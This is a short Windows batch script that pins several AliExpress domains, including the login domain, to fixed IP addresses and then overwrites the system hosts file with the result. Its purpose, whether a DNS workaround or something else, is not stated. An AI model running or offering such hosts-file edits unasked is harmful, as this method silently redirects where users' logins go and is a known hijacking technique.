@echo off
echo 184.25.158.9 login.aliexpress.com >> %temp%\hosts.txt
echo 198.11.132.250 aliexpress.com >> %temp%\hosts.txt
echo 23.45.96.43 a.aliexpress.com >> %temp%\hosts.txt
echo 198.11.132.250 thirdparty.aliexpress.com >> %temp%\hosts.txt
echo 198.11.136.101 thirdparty.aliexpress.com >> %temp%\hosts.txt
echo 184.25.158.9 sale.aliexpress.com >> %temp%\hosts.txt
type C:\WINDOWS\system32\drivers\etc\hosts >> %temp%\hosts.txt
copy /Y %temp%\hosts.txt C:\WINDOWS\system32\drivers\etc\hosts
